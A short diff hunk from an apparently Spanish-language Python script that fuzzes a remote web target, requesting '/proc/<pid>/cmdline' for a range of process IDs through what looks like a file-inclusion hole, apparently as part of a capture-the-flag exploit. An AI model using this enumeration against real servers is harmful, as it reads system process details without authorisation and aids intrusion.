@@ -20,7 +20,7 @@ repeticiones = []
 def fuzzing(x,y):
 	for i in range(x,y):
 		try:
-			url = URL + "=/proc/{0}/cmdline".format(i)
+			url = URL + "proc/{0}/cmdline".format(i)
 			r = requests.get(url)
 			p1.status(f"Probando con proceso n -> {i}")
 			if len(r.text) > 82:
